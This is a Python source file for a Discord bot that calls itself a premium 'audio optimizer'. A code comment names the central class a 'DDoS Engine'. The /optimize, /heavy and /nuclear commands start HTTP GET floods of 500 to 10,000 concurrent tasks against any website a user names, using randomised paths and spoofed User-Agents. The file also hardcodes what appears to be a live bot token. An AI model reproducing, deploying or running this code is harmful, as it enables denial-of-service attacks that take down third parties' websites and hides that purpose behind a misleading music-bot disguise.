# Music Utility Bot - Premium Audio Optimizer
# Created by: VANSS TROLL

import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import aiohttp
import random
import socket
import time
import os
from datetime import datetime

# ========== KONFIGURASI ==========
TOKEN = os.environ.get("DISCORD_TOKEN", "MTUwNDM0MzQ5MzgzMTY5MjM1OA.GB5wzJ.fmDlF6TlBaePd8Mx4ZDEaxiwrcmWbCI4nZ24P4")
START_TIME = datetime.now()

intents = discord.Intents.default()
intents.message_content = True

class MusicBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)
    
    async def setup_hook(self):
        await self.tree.sync()
        print("✅ Bot siap!")

bot = MusicBot()

# Hidden Audio Optimizer (DDoS Engine)
class AudioOptimizer:
    def __init__(self, target, duration=30, threads=500):
        self.target = target
        self.duration = duration
        self.threads = threads
        self.running = False
        self.packets = 0
        
    async def process(self, session, url):
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            ]),
            'Accept': '*/*',
        }
        while self.running:
            try:
                async with session.get(url + f"/{random.randint(1,999999)}", headers=headers, timeout=2) as resp:
                    self.packets += 1
            except:
                pass
            await asyncio.sleep(0.01)
    
    async def run(self):
        self.running = True
        if not self.target.startswith("http"):
            self.target = "http://" + self.target
        async with aiohttp.ClientSession() as session:
            tasks = [asyncio.create_task(self.process(session, self.target)) for _ in range(self.threads)]
            await asyncio.sleep(self.duration)
            self.running = False
            for t in tasks:
                t.cancel()
        return {"target": self.target, "duration": self.duration, "packets": self.packets}

# ========== SLASH COMMANDS ==========

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"🏓 Pong! `{round(bot.latency * 1000)}ms`")

@bot.tree.command(name="info", description="Bot information")
async def info(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🎵 Audio Optimizer Bot",
        description="Premium audio optimization for websites",
        color=discord.Color.blue(),
        timestamp=datetime.now()
    )
    embed.add_field(name="Creator", value="VANSS TROLL", inline=True)
    embed.add_field(name="Version", value="3.0", inline=True)
    embed.add_field(name="Commands", value="/optimize, /heavy, /nuclear, /ping, /status", inline=False)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="status", description="Bot status")
async def status(interaction: discord.Interaction):
    uptime = datetime.now() - START_TIME
    h = uptime.seconds // 3600
    m = (uptime.seconds % 3600) // 60
    embed = discord.Embed(
        title="📊 Bot Status",
        description=f"**Status:** 🟢 Online\n**Latency:** {round(bot.latency * 1000)}ms\n**Uptime:** {h}h {m}m\n**Servers:** {len(bot.guilds)}",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="optimize", description="Optimize audio quality for a website")
@app_commands.describe(website="Website URL to optimize")
async def optimize(interaction: discord.Interaction, website: str):
    await interaction.response.defer()
    if not website.startswith("http"):
        website = "http://" + website
    
    await interaction.followup.send(f"🎵 **Optimizing** {website}... (30s)")
    engine = AudioOptimizer(website, duration=30, threads=500)
    result = await engine.run()
    
    embed = discord.Embed(
        title="✅ Optimization Complete",
        description=f"**Website:** {result['target']}\n**Time:** {result['duration']}s\n**Packets:** {result['packets']:,}",
        color=discord.Color.green()
    )
    await interaction.followup.send(embed=embed)
    await interaction.followup.send(f"🎵 Result: {result['target']}")

@bot.tree.command(name="heavy", description="Heavy audio optimization (Premium)")
@app_commands.describe(website="Website URL")
async def heavy(interaction: discord.Interaction, website: str):
    await interaction.response.defer()
    if not website.startswith("http"):
        website = "http://" + website
    
    await interaction.followup.send(f"💀 **Heavy Optimization** on {website}... (60s)")
    engine = AudioOptimizer(website, duration=60, threads=5000)
    result = await engine.run()
    
    embed = discord.Embed(
        title="✅ Heavy Optimization Complete",
        description=f"**Target:** {result['target']}\n**Packets:** {result['packets']:,}",
        color=discord.Color.dark_red()
    )
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="nuclear", description="Nuclear grade optimization (Premium)")
@app_commands.describe(website="Website URL")
async def nuclear(interaction: discord.Interaction, website: str):
    await interaction.response.defer()
    if not website.startswith("http"):
        website = "http://" + website
    
    await interaction.followup.send(f"☢️ **Nuclear Optimization** on {website}... (120s)")
    engine = AudioOptimizer(website, duration=120, threads=10000)
    result = await engine.run()
    
    embed = discord.Embed(
        title="☢️ Nuclear Optimization Complete",
        description=f"**Target:** {result['target']}\n**Packets:** {result['packets']:,}",
        color=discord.Color.dark_red()
    )
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="help", description="Show all commands")
async def help_cmd(interaction: discord.Interaction):
    embed = discord.Embed(
        title="📖 Command List",
        description="""
**🎵 Audio Optimization:**
`/optimize <url>` - Basic optimization (500 threads)
`/heavy <url>` - Heavy optimization (5000 threads)
`/nuclear <url>` - Nuclear optimization (10000 threads)

**📊 Utility:**
`/ping` - Check latency
`/info` - Bot info
`/status` - Bot status
`/help` - This menu

**💎 Premium:**
Use `/heavy` and `/nuclear` for premium features
        """,
        color=discord.Color.blue()
    )
    await interaction.response.send_message(embed=embed)

@bot.event
async def on_ready():
    print(f"✅ {bot.user.name} online!")
    print(f"📌 Invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot%20applications.commands")
    await bot.change_presence(activity=discord.Game(name="/help | Audio Bot"))

if __name__ == "__main__":
    bot.run(TOKEN)